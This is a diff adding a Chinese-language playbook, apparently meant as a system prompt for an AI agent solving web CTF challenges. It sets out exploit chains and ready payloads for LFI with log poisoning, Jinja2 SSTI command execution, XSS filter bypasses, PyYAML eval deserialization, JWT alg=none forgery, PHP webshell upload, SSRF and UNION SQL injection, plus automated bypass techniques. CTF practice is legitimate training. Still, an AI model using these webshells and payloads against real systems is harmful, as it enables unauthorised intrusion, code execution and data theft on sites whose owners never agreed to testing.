@@ -1,0 +1,269 @@
+你可以：
+
+* 用它作为 **系统提示（system prompt）**
+* 或让 Agent 在每道题前自动执行这套推理步骤
+* 或让模型在**思考时强制遵循这套思维链**
+
+整个模板分成：
+
+# 🧠 **AI Agent CTF 通用推理链（Universal Reasoning Chain）**
+
+# 🔍 **题型判定器（Category Classifier）**
+
+# 🧩 **各题型专属推理链（Web 全套）**
+
+# ⚙️ **Payload 生成与利用链自动构建器**
+
+# 📌 **最终输出格式模板**
+
+---
+
+# 🧠 **AI Agent CTF 通用推理链（Universal Reasoning Chain）**
+
+（所有题型均使用）
+
+```
+1. 阅读题目 → 提取关键元素（输入点、输出点、参数、文件、回显）
+2. 判断题目的可控点（哪些参数/字段/内容对我可控）
+3. 判定题型（XSS/LFI/SSTI/反序列化/IDOR/上传/SSRF/SQLi…）
+4. 在对应题型知识库中查找利用方式与常见 payload 模板
+5. 根据题目特征定制 payload（自动适配过滤/正则/编码）
+6. 构造利用链（exploit chain）：
+    - 触发漏洞
+    - 获得回显 / RCE / 文件访问
+    - 获取 flag 所在路径
+    - 执行获取 flag 的最终 payload
+7. 验证 payload 是否成功（检查页面变化/返回码/回显内容）
+8. 若失败 → 自动进行绕过与变体生成：
+    - 编码绕过
+    - 双写绕过
+    - 事件触发替代
+    - 属性注入替代
+    - 路径重新组合
+    - 对象链重新构造
+9. 成功后 → 保存最终 payload + 利用链
+10. 输出最终结果与最简化 payload
+```
+
+---
+
+# 🔍 **题型判定器（Category Classifier）**
+
+（Agent 自动判断当前题属于哪类）
+
+```
+如果题目包含：
+ - include / file / path / ../../             → LFI
+ - {{ }} / {% %} / 7*7                         → SSTI
+ - <script> / onerror / autofocus              → XSS
+ - !!python/object / pickle / YAML             → YAML 反序列化
+ - phar:// / unserialize / manifest            → PHAR 反序列化
+ - JWT / token / header.alg                    → JWT 绕过
+ - admin=0/1 / user_id=xxx / header 注入        → IDOR
+ - http://127.0.0.1 / 外部可控 URL             → SSRF
+ - upload / file / .php                        → 上传漏洞
+ - SQL / select / union / error                → SQL 注入
+```
+
+如若匹配多个 → 优先考虑链式利用（如 上传→LFI→RCE）。
+
+---
+
+# 🧩 **各题型专属推理链（融合你的 ）**
+
+以下所有推理链已经吸收你 中的实战例题技术，并被抽象为可迁移模板。
+
+---
+
+# 📁 **LFI（含日志投毒 / 伪协议）推理链**
+
+```
+1. 检查路径参数是否可控 → 尝试 ../../ 穿越
+2. 读取 /etc/passwd 判断是否成功
+3. 若 PHP 文件被执行：
+      → 改用日志投毒：UA 注入 "<?php system($_GET['cmd']); ?>"
+4. 通过 LFI 包含 access.log 执行注入代码
+5. 传递 cmd=cat /FLAG
+6. 若 allow_url_include=On：
+      → 尝试 data:// 直接注入 PHP
+7. 输出 flag
+```
+
+**Payload 模板**
+
+```
+../../../../../../var/log/apache2/access.log
+User-Agent: <?php system($_GET['cmd']); ?>
+abspath=data://text/plain,<?php echo file_get_contents('/FLAG'); ?>
+```
+
+---
+
+# 🧩 **SSTI（Jinja2）推理链**
+
+```
+1. 输入 {{7*7}} → 返回 49 → 确认 SSTI
+2. 获取内置对象（如 cycler / joiner）
+3. 访问 cycler.next.__globals__ 获取全局空间
+4. 调用 os.popen('cat /FLAG').read()
+5. 若下划线/点号被过滤：
+      - 使用 attr()
+      - 使用 pop / join 构造 "_"
+6. 回显 flag
+```
+
+**Payload 模板**
+
+```
+{{ cycler.next.__globals__.os.popen('cat /FLAG').read() }}
+```
+
+---
+
+# 🧩 **XSS 推理链（事件型、双写、结构破坏、CSP 绕过）**
+
+```
+1. 找到反射点 → 输入 <a> 测试是否被过滤
+2. 若 <script> 被过滤：
+      - 尝试非 script（img/onerror）
+      - 尝试双写 <scscriptript>
+      - 尝试自动触发（autofocus/onfocus）
+      - 尝试 "1"> 破坏 HTML 结构
+3. 若 alert 被过滤 → prompt/confirm 或 fromCharCode 重构
+4. 触发 JS 执行
+5. 提取 flag（API 调用 / DOM 中）
+```
+
+**Payload 模板**
+
+```
+1"><scscriptript>alert(1)</scscriptript>
+<img src=x onerror=prompt(1)>
+<input autofocus onfocus=prompt(1)>
+```
+
+---
+
+# 🧩 **YAML / PyYAML 反序列化推理链**
+
+```
+1. Base64 解码 cookie → 检查是否存在 !!python/object 标记
+2. 若存在 → 替换字段为 !!python/object/apply
+3. 注入 eval('__import__("os").environ.get("FLAG")')
+4. 按服务端要求编码（如 ISO-8859-1）
+5. Base64 编码写回 cookie
+6. 浏览器刷新触发反序列化 → 回显 flag
+```
+
+**Payload 模板**
+
+```yaml
+!!python/object/apply:eval ['__import__("os").environ["FLAG"]']
+```
+
+---
+
+# 🧩 **IDOR / 逻辑越权推理链**
+
+```
+1. 寻找含 id/order_id/uid 的接口
+2. 枚举 ID → 判断响应差异
+3. 若接口不验证资源归属 → 越权成功
+4. 对 order / archive / receipt 等接口进行组合利用
+5. 最终访问资源中包含 flag
+```
+
+---
+
+# 🧩 **JWT（alg=none）推理链**
+
+```
+1. 解码 JWT → 检查 alg 字段
+2. 若 alg != HS256 且可控 → 替换为 none
+3. 构造 payload: {"role":"admin"}
+4. Base64URL 编码 header + payload
+5. 将 JWT 设置进 cookie
+6. 访问管理员接口 → 输出 flag
+```
+
+**Payload 模板**
+
+Header：
+
+```
+{"typ":"JWT","alg":"none"}
+```
+
+Payload：
+
+```
+{"role":"admin"}
+```
+
+---
+
+# 🧩 **文件上传 → RCE 推理链**
+
+```
+1. 找到上传接口 → 判断是否限制扩展名
+2. 若可上传 PHP → 直接上传 webshell
+3. 若限制扩展名 → 尝试 .php.jpg / .phtml / .phar
+4. 找到可访问路径并执行命令
+5. cat /FLAG 或读取环境变量
+```
+
+**Payload 模板**
+
+```
+<?php eval($_POST['cmd']); ?>
+```
+
+---
+
+# 🧩 **SSRF 推理链**
+
+```
+1. 找到可控 URL / markdown / image 链接
+2. 将 URL 指向 127.0.0.1
+3. 访问内部管理接口如 /admin/flag
+4. 后端代发请求 → 回显 flag
+```
+
+**Payload 模板**
+
+```
+![0](http://127.0.0.1:5000/flag)
+```
+
+---
+
+# 🧩 **SQLi 推理链**
+
+```
+1. 找到可控参数
+2. 使用 union / 报错 注入泄露表结构
+3. 获取 admin 密码
+4. 登录 admin 找 flag
+```
+
+**Payload 模板**
+
+```
+' UNION SELECT 1,username,password FROM users --
+```
+
+---
+
+# ⚙️ **Payload 生成器（AI Agent 自动尝试）**
+
+Agent 遇到过滤时应自动尝试：
+
+```
+1. 字符编码：URL、Unicode、HTML、Base64
+2. 字符替代：prompt → alert、fromCharCode 重构
+3. 双写绕过：scscriptript、....//....
+4. 事件触发：autofocus、onfocus、onmouseover
+5. 属性注入：1" autofocus onfocus=...
+6. 对象链重构（SSTI）：attr()、pop()、join()
+7. 多协议尝试（LFI）：php://filter、data://、phar://
+```
